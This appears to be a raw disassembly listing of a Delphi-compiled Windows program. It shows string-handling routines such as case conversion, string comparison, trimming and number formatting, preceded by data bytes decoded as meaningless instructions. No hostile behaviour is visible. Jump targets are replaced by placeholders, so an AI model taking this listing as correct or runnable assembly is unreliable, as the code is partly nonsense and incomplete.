add [ eax ] dl
inc eax
add [ eax ] cl
add [ ecx ] al
add [ eax + edi * 8 + 0x40 ] cl
add al 0x53
insb
add al [ eax ]
add al [ eax ]
sub [ eax ] al
dec eax
mov [ ecx ] eax
or [ ebp + 0x6e ] al
push edi
jb r-xdata
jb r-xdata
inc eax
add [ eax ] ch
add [ eax ] al
inc [ eax ]
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x520dffff ] al
jbe r-xdata
je r-xdata
add [ edx ] cl
inc edx
jns r-xdata
inc eax
add [ esi + edx * 2 + 0x67100040 ] dh
inc ecx
jae r-xdata
clc
adc [ eax ] al
sub [ eax ] al
add bh bh
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add eax [ eax ]
add [ eax ] al
add [ eax ] al
or [ eax ] al
add [ eax ] eax
add [ eax ] al
or [ eax ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] cl
add [ ecx ] al
add [ eax + edi * 8 + 0x40 ] cl
add al 0x53
insb
add al [ eax ]
add al [ eax ]
sub [ eax ] eax
cwde
mov [ ecx ] eax
or [ edx + 0x65 ] eax
imul ebp [ bp + 0x52 ] 0x3646165
add [ eax ] al
add [ eax ] al
add [ eax ] cl
add [ ecx ] al
add [ eax + edi * 8 + 0x40 ] cl
add al 0x53
insb
add al [ eax ]
add al [ eax ]
daa
add [ eax ] cl
mov al [ ecx ]
pop es
inc ebp
outsb
push edx
popad
add eax [ fs : eax ]
add [ eax ] al
add [ eax ] al
or [ eax ] al
add [ eax ] eax
mov cl bh
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
movsb [ edi ] [ esi ]
stc
inc eax
add [ edi ] al
push cs
inc ebp
inc ebp
outsb
arpl [ edi + 0x64 ] bp
imul ebp [ esi + 0x67 ] 0x6f727245
jb r-xdata
add [ eax - 0x2fffbfa8 ] dh
pop eax
inc eax
add ah dl
pop eax
inc eax
add al bl
pop eax
inc eax
add ah cl
pop eax
inc eax
add [ eax - 0x5bffbfab ] cl
mov ah 0x56
outsd
outsb
dec esp
jbe r-xdata
add [ eax ] al
add [ ecx + edi * 8 + 0x40 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
nop
stc
inc eax
add [ eax + eax ] bl
add [ eax ] al
dec esp
fadd [ eax ]
lodsb [ esi ]
push esi
stc
inc eax
add al ah
fadd [ eax ]
add [ eax ] al
or [ ebx + 0x79 ] dl
jae r-xdata
inc eax
add [ eax ] dl
inc ecx
insb
mov eax eax
add al 0xf9
inc eax
add [ ecx ] dl
or dl [ ebx + eax * 2 + 0x68 ]
popad
jb r-xdata
int3
je r-xdata
add [ eax ] al
add [ eax + 0x1c0040f9 ] dl
add [ eax ] al
add [ eax + ebx * 8 + 0x40 ] cl
add [ esi + edx * 2 + 0x56b40040 ] ch
jb r-xdata
inc eax
add [ eax + 0x46 ] ch
inc eax
add [ eax + 0x46 ] ch
inc eax
add [ eax + 0x46 ] ch
inc eax
add [ eax + 0x46 ] ch
inc eax
add [ eax + 0x46 ] ch
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ ecx ] al
add [ eax ] dl
inc eax
add [ eax + eax ] al
add [ eax ] al
or eax 0x53734946
imul ebp [ esi + 0x67 ] 0x7942656c
je r-xdata
insb
jae r-xdata
push ebp
inc eax
add [ esi ] dl
inc ecx
add [ eax + 0x58004166 ] bh
inc cx
add [ esi ] cl
inc ebp
inc ebp
outsb
arpl [ edi + 0x64 ] bp
imul ebp [ esi + 0x67 ] 0x6f727245
jb r-xdata
movsb [ edi ] [ esi ]
popad
jns r-xdata
call [ esi + edi * 8 ]
inc eax
add [ edx ] al
hlt
add al [ eax ]
add [ eax + edx + 0x80040 ] ebx
add [ eax ] al
or al 0x46
dec ebp
popad
js r-xdata
add [ eax ] al
add [ edx ] al
add [ ebp - 0x5d7ffc0 ] cl
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ch
add al [ ecx ]
inc esp
cli
inc eax
add [ ebp - 0x6 ] bh
inc eax
add [ eax ] al
add [ eax ] al
add [ ecx - 0x5 ] al
inc eax
add [ eax ] dl
add [ eax ] al
add [ esp + edx ] bh
inc eax
add [ esi + edx * 2 + 0x56b40040 ] ch
inc eax
add [ eax - 0x4fffbfa8 ] bh
pop eax
inc eax
add al dl
pop eax
inc eax
add ah dl
pop eax
inc eax
add al bl
pop eax
inc eax
add ah cl
pop eax
inc eax
add [ eax - 0x5bffbfab ] cl
push ebp
inc eax
add al ah
push ebp
inc eax
add [ eax + 0x46 ] ch
inc eax
add [ eax + 0x46 ] ch
add [ eax ] al
add [ eax ] al
add bh bh
add [ eax ] al
hlt
push 0x69537261
jpe r-xdata
call [ ebx ]
inc [ eax ]
inc edx
add ah dh
dec [ esi + 0x420040ff ]
add ah dh
dec ecx
inc [ eax ]
inc edx
add ah dh
[ edx ]
add al [ eax ]
add [ eax ] al
sbb [ eax ] al
dec ebx
sti
inc eax
add [ ebx ] al
hlt
sub_410c28
push ebp
mov ebp esp
push ebx
mov ebx edx
mov edx eax
shr edx 0x10
div bx
mov ebx [ ebp + 0x8 ]
mov [ ecx ] ax
mov [ ebx ] dx
pop ebx
pop ebp
retn 0x4
sub_410c44
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push esi
push edi
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4162b0
call sub_4060b0
pop edi
pop esi
pop ebx
retn
sub_410c68
push ebx
mov eax [ rw-data ]
mov edx [ eax ]
mov [ rw-data ] edx
mov edx [ rw-data ]
mov ecx [ eax + 0x4 ]
mov [ edx ] ecx
mov ebx [ eax + 0x8 ]
mov edx 0xc
call sub_404220
call ebx
pop ebx
retn
sub_410c94
push ebx
mov ebx eax
mov eax 0xc
call sub_404204
mov edx [ rw-data ]
mov [ eax ] edx
mov edx [ rw-data ]
mov edx [ edx ]
mov [ eax + 0x4 ] edx
mov [ eax + 0x8 ] ebx
mov [ rw-data ] eax
mov eax [ rw-data ]
mov [ eax ] sub_410c68
pop ebx
retn
sub_410ce0
push ebx
push esi
push ecx
mov ebx edx
mov esi eax
mov eax ebx
mov edx esi
call sub_4072ac
cmp [ ebx ] 0x0
je r-xdata
pop edx
pop esi
pop ebx
retn
mov edx [ ebx ]
mov eax edx
mov [ esp ] edx
mov edx [ esp ]
test edx edx
je r-xdata
cmp edx 0x1
jl r-xdata
sub edx 0x4
mov edx [ edx ]
movzx ecx [ eax ]
add ecx 0xffffff9f
sub cx 0x1a
jae r-xdata
add eax 0x2
dec edx
test edx edx
jne r-xdata
movzx ecx [ eax ]
xor cx 0x20
mov [ eax ] cx
sub_410d30
push ebx
push esi
push edi
push ecx
mov edi edx
mov ebx eax
test ebx ebx
je r-xdata
mov ax 0x2
mov eax ebx
sub eax 0xa
movzx eax [ eax ]
jmp r-xdata
mov eax ebx
test eax eax
je r-xdata
mov edx edi
mov [ esp ] ebx
mov eax [ esp ]
call sub_410ce0
jmp r-xdata
cmp ax 0x2
je r-xdata
mov esi eax
mov eax edi
mov edx esi
call sub_40740c
test esi esi
jle r-xdata
sub eax 0x4
mov eax [ eax ]
pop edx
pop edi
pop esi
pop ebx
retn
mov ecx [ edi ]
mov edx esi
cmp edx 0x1
jl r-xdata
movzx eax [ ebx ]
mov esi eax
add esi 0xffffff9f
sub si 0x1a
jae r-xdata
mov [ ecx ] ax
add ecx 0x2
add ebx 0x2
dec edx
test edx edx
jne r-xdata
xor ax 0x20
sub_410da8
push ebx
push esi
push ecx
mov ebx edx
mov esi eax
mov eax ebx
mov edx esi
call sub_4072ac
cmp [ ebx ] 0x0
je r-xdata
pop edx
pop esi
pop ebx
retn
mov edx [ ebx ]
mov eax edx
mov [ esp ] edx
mov edx [ esp ]
test edx edx
je r-xdata
cmp edx 0x1
jl r-xdata
sub edx 0x4
mov edx [ edx ]
movzx ecx [ eax ]
add ecx 0xffffffbf
sub cx 0x1a
jae r-xdata
add eax 0x2
dec edx
test edx edx
jne r-xdata
movzx ecx [ eax ]
or cx 0x20
mov [ eax ] cx
sub_410df8
push ebx
push esi
push edi
push ecx
mov edi edx
mov ebx eax
test ebx ebx
je r-xdata
mov ax 0x2
mov eax ebx
sub eax 0xa
movzx eax [ eax ]
jmp r-xdata
mov eax ebx
test eax eax
je r-xdata
mov edx edi
mov [ esp ] ebx
mov eax [ esp ]
call sub_410da8
jmp r-xdata
cmp ax 0x2
je r-xdata
mov esi eax
mov eax edi
mov edx esi
call sub_40740c
test esi esi
jle r-xdata
sub eax 0x4
mov eax [ eax ]
pop edx
pop edi
pop esi
pop ebx
retn
mov ecx [ edi ]
mov edx esi
cmp edx 0x1
jl r-xdata
movzx eax [ ebx ]
mov esi eax
add esi 0xffffffbf
sub si 0x1a
jae r-xdata
mov [ ecx ] ax
add ecx 0x2
add ebx 0x2
dec edx
test edx edx
jne r-xdata
or ax 0x20
sub_410e70
cmp eax edx
je r-xdata
xor eax eax
retn
test eax edx
je r-xdata
test eax eax
je r-xdata
push 0x0
push 0x0
cmp [ eax - 0xa ] 0x2
je r-xdata
sub eax [ edx - 0x4 ]
retn
test edx edx
jne r-xdata
cmp [ edx - 0xa ] 0x2
je r-xdata
push edx
mov edx eax
mov eax esp
call sub_4072ac
pop edx
mov eax [ esp ]
mov eax [ eax - 0x4 ]
retn
movzx ecx [ edx ]
cmp cx [ eax ]
je r-xdata
push eax
lea eax [ esp + 0x8 ]
call sub_4072ac
pop eax
mov edx [ esp + 0x4 ]
push ebx
mov ebx [ eax - 0x4 ]
xor ecx ecx
sub ebx [ edx - 0x4 ]
push ebx
adc ecx 0xffffffff
and ecx ebx
sub ecx [ eax - 0x4 ]
shl ecx 0x1
sub eax ecx
sub edx ecx
movzx eax [ eax ]
sub eax ecx
jmp r-xdata
bsf ebx ebx
shr ebx 0x4
add ebx ebx
add ecx ebx
jns r-xdata
add ecx 0x4
js r-xdata
mov ecx esp
mov edx [ ecx ]
or edx [ ecx + 0x4 ]
je r-xdata
pop eax
pop ebx
movzx eax [ ecx + eax ]
movzx edx [ ecx + edx ]
sub eax edx
pop ebx
pop ebx
jmp r-xdata
mov ebx [ ecx + eax ]
xor ebx [ ecx + edx ]
jne r-xdata
pop edx
pop edx
retn
push eax
mov eax ecx
mov edx 0x2
call sub_4068c4
pop eax
sub_410f30
add eax ecx
add edx ecx
xor ecx 0xffffffff
add eax 0xfffffff8
add edx 0xfffffff8
add ecx 0x9
push ebx
jg r-xdata
cmp ecx 0x4
jg r-xdata
mov ebx [ ecx + eax ]
cmp ebx [ ecx + edx ]
jne r-xdata
cmp ecx 0x6
jg r-xdata
mov ebx [ ecx + eax ]
cmp ebx [ ecx + edx ]
jne r-xdata
xor eax eax
pop ebx
retn
lea ebx [ ecx + eax ]
add ecx 0x4
and ebx 0x3
sub ecx ebx
jg r-xdata
cmp ecx 0x7
jg r-xdata
movzx ebx [ ecx + eax ]
cmp bx [ ecx + edx ]
jne r-xdata
add ecx 0x4
mov ebx [ ecx + eax ]
cmp ebx [ ecx + edx ]
jne r-xdata
mov eax 0x1
pop ebx
retn
movzx ebx [ eax + 0x7 ]
cmp bl [ edx + 0x7 ]
jne r-xdata
add ecx 0x2
mov ebx [ ecx + eax + 0x4 ]
cmp ebx [ ecx + edx + 0x4 ]
jne r-xdata
add ecx 0x8
jg r-xdata
mov ebx [ ecx + eax ]
cmp ebx [ ecx + edx ]
jne r-xdata
mov ebx [ ecx + eax + 0x4 ]
cmp ebx [ ecx + edx + 0x4 ]
jne r-xdata
add ecx 0x8
jle r-xdata
sub_410fc4
test eax eax
jne r-xdata
test edx edx
jne r-xdata
test edx edx
je r-xdata
push ebx
push ebp
push esi
push 0x0
push 0x0
cmp [ eax - 0xa ] 0x2
je r-xdata
mov eax [ eax - 0x4 ]
retn
retn
mov eax [ edx - 0x4 ]
neg eax
cmp [ edx - 0xa ] 0x2
je r-xdata
push edx
mov edx eax
lea eax [ esp + 0x4 ]
call sub_4072ac
pop edx
mov eax [ esp ]
mov ebp [ eax - 0x4 ]
mov ebx [ edx - 0x4 ]
sub ebp ebx
sbb ecx ecx
and ecx ebp
add ecx ebx
lea esi [ eax + ecx * 2 ]
add edx ecx
add edx ecx
neg ecx
je r-xdata
push eax
lea eax [ esp + 0x8 ]
call sub_4072ac
pop eax
mov edx [ esp + 0x4 ]
mov eax ebp
mov eax [ esi + ecx * 2 ]
mov ebx [ edx + ecx * 2 ]
cmp eax ebx
je r-xdata
add esp 0x8
pop esi
pop ebp
pop ebx
retn
push eax
mov eax ecx
mov edx 0x2
call sub_4068c4
pop eax
add ecx 0x2
jl r-xdata
cmp ax bx
je r-xdata
shr eax 0x10
shr ebx 0x10
cmp eax 0x61
jl r-xdata
and eax 0xffff
and ebx 0xffff
cmp eax 0x61
jl r-xdata
cmp ebx 0x61
jl r-xdata
cmp eax 0x7a
jg r-xdata
cmp ebx 0x61
jl r-xdata
cmp eax 0x7a
jg r-xdata
sub eax ebx
jne r-xdata
cmp ebx 0x7a
jg r-xdata
sub eax 0x20
sub eax ebx
jne r-xdata
cmp ebx 0x7a
jg r-xdata
sub eax 0x20
mov ecx esp
mov edx [ ecx ]
or edx [ ecx + 0x4 ]
je r-xdata
sub ebx 0x20
mov eax [ esi + ecx * 2 ]
mov ebx [ edx + ecx * 2 ]
and eax 0xffff0000
and ebx 0xffff0000
cmp eax ebx
je r-xdata
sub ebx 0x20
sub_4110d4
cmp eax edx
je r-xdata
mov al 0x1
or eax eax
je r-xdata
retn
or edx edx
je r-xdata
xor eax eax
retn
mov ecx [ eax - 0x4 ]
cmp ecx [ edx - 0x4 ]
jne r-xdata
call sub_410fc4
test eax eax
jne r-xdata
sub_4110f8
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call j_sub_406bfc
xor eax eax
push ebp
push sub_41117c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
test eax eax
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_407134
mov edx eax
mov eax esi
mov ecx ebx
call sub_4071e4
test ebx ebx
jle r-xdata
sub eax 0x4
mov eax [ eax ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_406a50
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_411183
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
push ebx
mov eax [ esi ]
call sub_407134
push eax
call CharUpperBuffW
sub_411188
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call j_sub_406bfc
mov eax [ ebp - 0x8 ]
call j_sub_406bfc
xor eax eax
push ebp
push sub_411244
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov ebx eax
test ebx ebx
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
mov eax [ ebp - 0x8 ]
test eax eax
je r-xdata
sub ebx 0x4
mov ebx [ ebx ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_406a50
mov esi eax
test esi esi
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
push esi
mov eax [ ebp - 0x8 ]
call sub_407134
push eax
push ebx
mov eax [ ebp - 0x4 ]
call sub_407134
push eax
push 0x0
push 0x400
call CompareStringW
sub eax 0x2
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41124b
lea eax [ ebp - 0x8 ]
mov edx 0x2
call j_sub_4068c4
retn
sub esi 0x4
mov esi [ esi ]
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0x8 ]
call sub_406a50
sub_411254
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call j_sub_406bfc
mov eax [ ebp - 0x8 ]
call j_sub_406bfc
xor eax eax
push ebp
push sub_411310
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov ebx eax
test ebx ebx
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
mov eax [ ebp - 0x8 ]
test eax eax
je r-xdata
sub ebx 0x4
mov ebx [ ebx ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_406a50
mov esi eax
test esi esi
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
push esi
mov eax [ ebp - 0x8 ]
call sub_407134
push eax
push ebx
mov eax [ ebp - 0x4 ]
call sub_407134
push eax
push 0x1
push 0x400
call CompareStringW
sub eax 0x2
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_411317
lea eax [ ebp - 0x8 ]
mov edx 0x2
call j_sub_4068c4
retn
sub esi 0x4
mov esi [ esi ]
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0x8 ]
call sub_406a50
sub_411320
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call j_sub_406bfc
xor eax eax
push ebp
push sub_4113d2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
test eax eax
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
mov esi eax
mov ebx 0x1
jmp r-xdata
sub eax 0x4
mov eax [ eax ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_406a50
cmp esi ebx
jl r-xdata
cmp esi ebx
jge r-xdata
lea eax [ ebp - 0x4 ]
call sub_406a60
cmp [ eax + ebx * 2 - 0x2 ] 0x20
jbe r-xdata
lea eax [ ebp - 0x4 ]
call sub_406a60
cmp [ eax + esi * 2 - 0x2 ] 0x20
jbe r-xdata
mov eax [ ebp - 0x8 ]
xor edx edx
call sub_4070a8
jmp r-xdata
inc ebx
dec esi
mov eax [ ebp - 0x8 ]
push eax
mov ecx esi
sub ecx ebx
inc ecx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4077d0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4113d9
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
sub_4113e0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x10 ] ebx
mov edi ecx
mov [ ebp - 0x6 ] dx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call j_sub_406bfc
xor eax eax
push ebp
push sub_411570
push [ fs : eax ]
mov [ fs : eax ] esp
xor esi esi
mov eax [ ebp - 0x4 ]
call sub_407134
movzx edx [ ebp - 0x6 ]
call sub_417c84
mov ebx eax
test ebx ebx
je r-xdata
test esi esi
jne r-xdata
add ebx 0x2
inc esi
movzx edx [ ebp - 0x6 ]
mov eax ebx
call sub_417c84
mov ebx eax
test ebx ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
lea eax [ ebp - 0xc ]
movzx edx [ ebp - 0x6 ]
call sub_407214
push [ ebp - 0xc ]
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
movzx edx [ ebp - 0x6 ]
call sub_407214
push [ ebp - 0x10 ]
mov eax edi
mov edx 0x3
call sub_407648
jmp r-xdata
test eax eax
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_411577
lea eax [ ebp - 0x10 ]
mov edx 0x2
call j_sub_4068c4
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
lea edx [ esi + eax + 0x2 ]
mov eax edi
call sub_40740c
mov eax [ edi ]
call sub_407134
mov edi eax
movzx eax [ ebp - 0x6 ]
mov [ edi ] ax
add edi 0x2
mov eax [ ebp - 0x4 ]
call sub_407134
mov esi eax
movzx edx [ ebp - 0x6 ]
mov eax esi
call sub_417c84
mov ebx eax
sub eax 0x4
mov eax [ eax ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_406a50
mov ecx eax
add ecx ecx
mov edx edi
mov eax esi
call sub_4043c8
mov eax ebx
sub eax esi
sar eax 0x1
jns r-xdata
adc eax 0x0
add eax eax
add edi eax
movzx eax [ ebp - 0x6 ]
mov [ edi ] ax
add edi 0x2
mov esi ebx
movzx edx [ ebp - 0x6 ]
mov eax esi
call sub_417c84
mov ebx eax
test ebx ebx
jne r-xdata
adc eax 0x0
add ebx 0x2
mov eax ebx
sub eax esi
sar eax 0x1
jns r-xdata
mov eax esi
call sub_412570
mov ebx eax
mov eax ebx
sub eax esi
sar eax 0x1
jns r-xdata
mov ecx eax
add ecx ecx
mov edx edi
mov eax esi
call sub_4043c8
sub ebx esi
sar ebx 0x1
jns r-xdata
adc eax 0x0
mov eax ebx
add eax eax
add edi eax
movzx eax [ ebp - 0x6 ]
mov [ edi ] ax
adc ebx 0x0
sub_411580
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] ecx
mov edi edx
mov ebx eax
mov eax [ esp ]
xor edx edx
call sub_4070a8
cmp [ ebx ] 0x0
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebx ]
cmp di [ eax ]
jne r-xdata
add [ ebx ] 0x2
mov ebp 0x1
mov esi [ ebx ]
mov eax [ ebx ]
mov edx edi
call sub_417c84
mov [ ebx ] eax
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
add [ ebx ] 0x2
mov eax [ ebx ]
cmp di [ eax ]
jne r-xdata
cmp [ ebx ] 0x0
jne r-xdata
add [ ebx ] 0x2
inc ebp
mov eax [ ebx ]
mov edx edi
call sub_417c84
mov [ ebx ] eax
mov eax [ ebx ]
sub eax esi
sar eax 0x1
jns r-xdata
mov eax esi
call sub_412570
mov [ ebx ] eax
cmp eax 0x1
jle r-xdata
adc eax 0x0
mov edx eax
sub edx ebp
je r-xdata
cmp ebp 0x1
jne r-xdata
mov edx eax
sub edx ebp
mov eax [ esp ]
call sub_40740c
mov eax [ esp ]
mov eax [ eax ]
call sub_407134
mov ebp eax
mov edx edi
mov eax esi
call sub_417c84
mov [ ebx ] eax
jmp r-xdata
mov ecx eax
dec ecx
mov eax [ esp ]
mov edx esi
call sub_4071e4
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
add [ ebx ] 0x2
mov eax [ ebx ]
cmp di [ eax ]
jne r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax [ ebx ]
sub eax esi
sar eax 0x1
jns r-xdata
mov eax [ ebx ]
sub eax esi
sar eax 0x1
jns r-xdata
mov eax esi
call sub_412570
mov [ ebx ] eax
mov ecx eax
add ecx ecx
mov edx ebp
mov eax esi
call sub_4043c8
mov eax [ ebx ]
sub eax esi
sar eax 0x1
jns r-xdata
adc eax 0x0
dec eax
mov ecx eax
add ecx ecx
mov edx ebp
mov eax esi
call sub_4043c8
adc eax 0x0
add eax eax
add ebp eax
add [ ebx ] 0x2
mov esi [ ebx ]
mov eax [ ebx ]
mov edx edi
call sub_417c84
mov [ ebx ] eax
adc eax 0x0
sub_4116bc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call j_sub_406bfc
xor eax eax
push ebp
push sub_411855
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x5 ] 0x0
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
test eax eax
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
test eax eax
jne r-xdata
sub eax 0x4
mov eax [ eax ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_406a50
mov esi [ ebp - 0x4 ]
test esi esi
je r-xdata
mov al 0x1
jmp r-xdata
movzx eax [ esi ]
call sub_40d310
test al al
jne r-xdata
mov eax esi
sub eax 0xa
cmp [ eax ] 0x2
je r-xdata
test al al
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ esi ] 0x5f
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_406a50
mov esi eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41185c
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
test bl bl
je r-xdata
mov al 0x1
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
test eax eax
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
test eax eax
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
mov edi eax
sub edi 0x2
jl r-xdata
sub eax 0x4
mov eax [ eax ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_406a50
mov edi eax
sub edi 0x2
jl r-xdata
sub eax 0x4
mov eax [ eax ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_406a50
mov [ ebp - 0x5 ] 0x1
inc edi
mov ebx 0x2
inc edi
mov ebx 0x2
movzx eax [ esi + ebx * 2 - 0x2 ]
call sub_40d39c
test al al
jne r-xdata
mov eax esi
sub eax 0xa
cmp [ eax ] 0x2
je r-xdata
movzx eax [ esi + ebx * 2 - 0x2 ]
call sub_40d39c
test al al
jne r-xdata
mov eax esi
sub eax 0xa
cmp [ eax ] 0x2
je r-xdata
inc ebx
dec edi
jne r-xdata
cmp [ esi + ebx * 2 - 0x2 ] 0x5f
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_406a50
mov esi eax
inc ebx
dec edi
jne r-xdata
cmp [ esi + ebx * 2 - 0x2 ] 0x5f
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_406a50
mov esi eax
mov esi [ ebp - 0x4 ]
test esi esi
je r-xdata
mov esi [ ebp - 0x4 ]
test esi esi
je r-xdata
jmp r-xdata
cmp [ esi + ebx * 2 - 0x2 ] 0x2e
jne r-xdata
sub_411868
or cl cl
jne r-xdata
push edx
push esi
or eax eax
jns sub_41187e
mov [ esi ] dl
or eax eax
jne r-xdata
add dl 0x7
neg eax
call sub_41187e
mov al 0x2d
inc ecx
dec esi
mov [ esi ] al
retn
xor edx edx
div ecx
dec esi
add dl 0x30
cmp dl 0x3a
jb r-xdata
pop ecx
pop edx
sub ecx esi
sub edx ecx
jbe r-xdata
retn
add ecx edx
mov al 0x30
sub esi edx
jmp r-xdata
dec edx
jne r-xdata
mov [ edx + esi ] al
mov [ esi ] al
sub_41187e
mov ecx 0xa
push edx
push esi
mov [ esi ] dl
or eax eax
jne r-xdata
add dl 0x7
xor edx edx
div ecx
dec esi
add dl 0x30
cmp dl 0x3a
jb r-xdata
pop ecx
pop edx
sub ecx esi
sub edx ecx
jbe r-xdata
retn
add ecx edx
mov al 0x30
sub esi edx
jmp r-xdata
dec edx
jne r-xdata
mov [ edx + esi ] al
mov [ esi ] al
sub_4118d0
mov ecx 0xa
push edx
push esi
mov [ esi ] dx
or eax eax
jne r-xdata
add dx 0x7
xor edx edx
div ecx
add dx 0x30
sub esi 0x2
cmp dx 0x3a
jb r-xdata
pop ecx
pop edx
sub ecx esi
shr ecx 0x1
sub edx ecx
jbe r-xdata
retn
add ecx edx
sub esi edx
mov ax 0x30
sub esi edx
jmp r-xdata
dec edx
jne r-xdata
mov [ esi + edx * 2 ] ax
mov [ esi ] ax
sub_411914
push esi
mov esi esp
sub esp 0x10
xor ecx ecx
push edx
xor edx edx
call sub_411868
mov edx esi
pop eax
call sub_4071d4
add esp 0x10
pop esi
retn
sub_411934
push ebp
mov ebp esp
add esp 0xfffffff8
push 0x0
lea edx [ ebp + 0x8 ]
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] 0x10
lea ecx [ ebp - 0x8 ]
mov edx r-xdata
call sub_412a08
pop ecx
pop ecx
pop ebp
retn 0x8
sub_4119a8
push esi
sub esp 0x4
fnstcw [ esp + 0x2 ]
fnstcw [ esp ]
or [ esp ] 0xf00
fldcw [ esp ]
mov [ esp ] cx
fld1
test [ eax + 0x4 ] 0x80000000
je r-xdata
fild [ eax ]
push [ eax + 0x4 ]
push [ eax ]
and [ esp + 0x4 ] 0x7fffffff
push 0x7fffffff
push 0xffffffff
fild [ esp + 0x8 ]
fild [ esp ]
fadd st2
faddp st1
add esp 0x10
jmp r-xdata
mov [ esi ] ax
fld st1
fcom st3
fwait
fnstsw ax
sahf
jae r-xdata
add ax 0x7
fild [ esp ]
fld st1
sub esi 0x2
fprem
fistp [ esi ]
fdiv st1
mov ax [ esi ]
add ax 0x30
cmp ax 0x3a
jb r-xdata
fldcw [ esp + 0x2 ]
add esp 0x4
ffree st3
ffree st2
ffree st1
ffree st0
pop ecx
